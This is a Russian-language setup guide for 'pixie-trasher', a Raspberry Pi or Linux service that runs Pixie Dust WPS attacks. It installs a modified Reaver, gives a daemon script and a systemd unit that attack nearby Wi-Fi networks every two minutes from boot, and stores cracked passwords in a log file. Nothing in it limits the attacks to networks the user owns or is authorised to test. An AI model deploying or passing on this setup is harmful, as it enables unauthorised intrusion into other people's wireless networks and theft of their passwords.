
# 📖 ПОЛНАЯ ИНСТРУКЦИЯ ПО УСТАНОВКЕ pixie-trasher

---

## 📋 СОДЕРЖАНИЕ

1. Требования к системе
2. Установка зависимостей
3. Установка модифицированного Reaver
4. Создание файлов скрипта
5. Настройка OLED дисплея (опционально)
6. Запуск и проверка
7. Настройка автозапуска (systemd)
8. Управление службой
9. Устранение неполадок

---

## 1️⃣ ТРЕБОВАНИЯ К СИСТЕМЕ

| Компонент | Требование |
|-----------|------------|
| **Операционная система** | Debian / Ubuntu / Raspberry Pi OS / Kali Linux |
| **Wi-Fi адаптер** | С поддержкой режима монитора (Atheros, Ralink, Realtek) |
| **Права доступа** | root (sudo) |
| **Интернет** | Для установки пакетов |
| **OLED дисплей** | SSD1306 или SH1106 (опционально) |

---

## 2️⃣ УСТАНОВКА ЗАВИСИМОСТЕЙ

Откройте терминал и выполните команды:

```bash
# Обновление списка пакетов
sudo apt update

# Установка основных пакетов
sudo apt install -y \
    aircrack-ng \
    wireless-tools \
    python3-pip \
    build-essential \
    libpcap-dev \
    libsqlite3-dev \
    git \
    screen

# Установка Python библиотеки для OLED (опционально)
pip3 install luma.oled
```

---

## 3️⃣ УСТАНОВКА МОДИФИЦИРОВАННОГО REAVER

Стандартный Reaver **НЕ ПОДДЕРЖИВАЕТ** Pixie Dust. Нужна специальная версия:

```bash
# Удаляем старую версию (если установлена)
sudo apt remove reaver -y

# Переходим во временную папку
cd /tmp

# Клонируем форк с поддержкой Pixie Dust
git clone https://github.com/t6x/reaver-wps-fork-t6x

# Переходим в папку с исходниками
cd reaver-wps-fork-t6x/src

# Компилируем
./configure
make

# Устанавливаем
sudo make install

# Возвращаемся в домашнюю папку
cd ~

# Проверяем установку (должна быть опция -K)
reaver -h 2>&1 | grep -i pixie
```

**Ожидаемый вывод:**
```
        -K, --pixie-dust                Run pixiedust attack
```

---

## 4️⃣ СОЗДАНИЕ ФАЙЛОВ СКРИПТА

### 4.1 Основной скрипт атаки

```bash
# Создаём файл
sudo nano /root/pixie_attacker.sh
```

**Скопируйте содержимое скрипта** (см. файл `pixie_attacker.sh` выше) и сохраните (Ctrl+X, Y, Enter).

```bash
# Делаем исполняемым
sudo chmod +x /root/pixie_attacker.sh
```

### 4.2 Скрипт для OLED (опционально)

```bash
# Создаём файл
sudo nano /root/oled_display.py
```

**Скопируйте содержимое скрипта** (см. файл `oled_display.py` выше) и сохраните.

```bash
# Делаем исполняемым
sudo chmod +x /root/oled_display.py
```

### 4.3 Демон для циклического запуска

```bash
# Создаём файл демона
sudo nano /usr/local/bin/pixie-attacker-daemon.sh
```

**Скопируйте содержимое:**

```bash
#!/bin/bash

INTERVAL=120  # 2 минуты между циклами
LOG_FILE="/var/log/pixie-attacker.log"

log() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" | tee -a "$LOG_FILE"
}

log "=== Pixie-Dust Attacker Daemon Started ==="

while true; do
    log "--- Starting new attack cycle ---"
    
    /root/pixie_attacker.sh -t 30 -o /var/log/pixie_results < /dev/null
    
    exit_code=$?
    log "Attack cycle finished with exit code: $exit_code"
    
    log "Waiting ${INTERVAL} seconds before next cycle..."
    sleep $INTERVAL
done
```

```bash
# Делаем исполняемым
sudo chmod +x /usr/local/bin/pixie-attacker-daemon.sh
```

### 4.4 Создание директорий

```bash
# Директория для результатов
sudo mkdir -p /var/log/pixie_results
```

---

## 5️⃣ НАСТРОЙКА OLED ДИСПЛЕЯ (опционально)

### 5.1 Подключение к Raspberry Pi

| Pin на OLED | Pin на Raspberry Pi |
|-------------|---------------------|
| VCC | Pin 1 (3.3V) |
| GND | Pin 6 (GND) |
| SDA | Pin 3 (GPIO2) |
| SCL | Pin 5 (GPIO3) |

### 5.2 Включение I2C на Raspberry Pi

```bash
# Запускаем конфигуратор
sudo raspi-config

# Выбираем:
# 3 Interface Options → I5 I2C → Yes

# Перезагружаемся
sudo reboot
```

### 5.3 Проверка подключения

```bash
# После перезагрузки проверяем
sudo i2cdetect -y 0
```

**Ожидаемый вывод (адрес 0x3C):**
```
     0  1  2  3  4  5  6  7  8  9  a  b  c  d  e  f
00:                         -- -- -- -- -- -- -- -- 
30: -- -- -- -- -- -- -- -- -- -- -- -- 3c -- -- --
```

---

## 6️⃣ ЗАПУСК И ПРОВЕРКА

### 6.1 Ручной запуск (интерактивный)

```bash
sudo /root/pixie_attacker.sh
```

### 6.2 Ручной запуск (неинтерактивный)

```bash
sudo /root/pixie_attacker.sh -t 30 -o /var/log/pixie_results < /dev/null
```

### 6.3 Проверка результатов

```bash
# Просмотр найденных паролей
cat /var/log/pixie_results/cracked_passwords.txt

# Просмотр лога
cat /var/log/pixie-attacker.log
```

---

## 7️⃣ НАСТРОЙКА АВТОЗАПУСКА (systemd)

### 7.1 Создание службы

```bash
# Создаём файл службы
sudo nano /etc/systemd/system/pixie-attacker.service
```

**Скопируйте содержимое:**

```ini
[Unit]
Description=Pixie-Dust WPS Attacker Service
After=network.target multi-user.target

[Service]
Type=simple
User=root
WorkingDirectory=/root
ExecStart=/usr/local/bin/pixie-attacker-daemon.sh
Restart=always
RestartSec=10
StandardOutput=journal
StandardError=journal

[Install]
WantedBy=multi-user.target
```

### 7.2 Запуск службы

```bash
# Перезагружаем конфигурацию systemd
sudo systemctl daemon-reload

# Включаем автозапуск при загрузке
sudo systemctl enable pixie-attacker

# Запускаем службу сейчас
sudo systemctl start pixie-attacker

# Проверяем статус
sudo systemctl status pixie-attacker
```

---

## 8️⃣ УПРАВЛЕНИЕ СЛУЖБОЙ

| Команда | Действие |
|---------|----------|
| `sudo systemctl start pixie-attacker` | Запустить службу |
| `sudo systemctl stop pixie-attacker` | Остановить службу |
| `sudo systemctl restart pixie-attacker` | Перезапустить службу |
| `sudo systemctl status pixie-attacker` | Показать статус |
| `sudo systemctl enable pixie-attacker` | Автозапуск при загрузке |
| `sudo systemctl disable pixie-attacker` | Отключить автозапуск |

### Просмотр логов

```bash
# Логи службы в реальном времени
sudo journalctl -u pixie-attacker -f

# Последние 50 строк логов
sudo journalctl -u pixie-attacker -n 50

# Логи за последний час
sudo journalctl -u pixie-attacker --since "1 hour ago"
```

### Изменение интервала атак

```bash
# Редактируем файл демона
sudo nano /usr/local/bin/pixie-attacker-daemon.sh

# Изменяем INTERVAL (в секундах):
# INTERVAL=120  (2 минуты)
# INTERVAL=300  (5 минут)
# INTERVAL=600  (10 минут)
# INTERVAL=3600 (1 час)

# Перезапускаем службу
sudo systemctl restart pixie-attacker
```

---

## 9️⃣ УСТРАНЕНИЕ НЕПОЛАДОК

### ❌ Ошибка: `reaver: command not found`

```bash
# Установите модифицированный Reaver (см. раздел 3)
```

### ❌ Ошибка: `wash: command not found`

```bash
sudo apt install reaver -y
```

### ❌ Ошибка: `status=203/EXEC`

```bash
# Проверьте существование файла
ls -la /usr/local/bin/pixie-attacker-daemon.sh

# Проверьте права
sudo chmod +x /usr/local/bin/pixie-attacker-daemon.sh

# Проверьте формат (должен быть LF)
file /usr/local/bin/pixie-attacker-daemon.sh
```

### ❌ Ошибка: `No wireless interfaces found`

```bash
# Проверьте видимость Wi-Fi адаптера
iwconfig

# Проверьте режим монитора
sudo airmon-ng start wlan0
```

### ❌ Служба не запускается

```bash
# Посмотрите подробные логи
sudo journalctl -u pixie-attacker -n 50 --no-pager

# Проверьте синтаксис service файла
sudo systemd-analyze verify /etc/systemd/system/pixie-attacker.service
```

### ❌ Ошибка I2C при использовании OLED

```bash
# Проверьте подключение
sudo i2cdetect -y 0

# Проверьте порт в скрипте (I2C_PORT = 0 или 1)
```

---

## 📁 СТРУКТУРА ФАЙЛОВ ПОСЛЕ УСТАНОВКИ

```
/root/
├── pixie_attacker.sh              # Основной скрипт
└── oled_display.py                # OLED поддержка (опционально)

/usr/local/bin/
└── pixie-attacker-daemon.sh       # Демон

/etc/systemd/system/
└── pixie-attacker.service         # systemd служба

/var/log/
├── pixie_results/                 # Результаты атак
│   └── cracked_passwords.txt      # Найденные пароли
└── pixie-attacker.log             # Лог демона
```

---

## 🚀 БЫСТРАЯ УСТАНОВКА (ВСЕ КОМАНДЫ ОДНИМ БЛОКОМ)

```bash
# 1. Зависимости
sudo apt update
sudo apt install -y aircrack-ng wireless-tools python3-pip build-essential libpcap-dev libsqlite3-dev git
pip3 install luma.oled

# 2. Модифицированный Reaver
sudo apt remove reaver -y
cd /tmp
git clone https://github.com/t6x/reaver-wps-fork-t6x
cd reaver-wps-fork-t6x/src
./configure && make && sudo make install
cd ~

# 3. Директории
sudo mkdir -p /var/log/pixie_results

# 4. Создание скриптов (СКОПИРУЙТЕ СОДЕРЖИМОЕ ОТДЕЛЬНО!)
# sudo nano /root/pixie_attacker.sh
# sudo nano /root/oled_display.py
# sudo nano /usr/local/bin/pixie-attacker-daemon.sh
# sudo nano /etc/systemd/system/pixie-attacker.service

# 5. Права
sudo chmod +x /root/pixie_attacker.sh
sudo chmod +x /root/oled_display.py
sudo chmod +x /usr/local/bin/pixie-attacker-daemon.sh

# 6. Запуск службы
sudo systemctl daemon-reload
sudo systemctl enable pixie-attacker
sudo systemctl start pixie-attacker

# 7. Проверка
sudo systemctl status pixie-attacker
sudo journalctl -u pixie-attacker -f
```

---

## ✅ ПОСЛЕ УСТАНОВКИ

Служба будет автоматически:
1. Запускаться при загрузке системы
2. Сканировать WPS сети каждые 2 минуты
3. Атаковать сети с хорошим сигналом
4. Сохранять найденные пароли в `/var/log/pixie_results/cracked_passwords.txt`

---
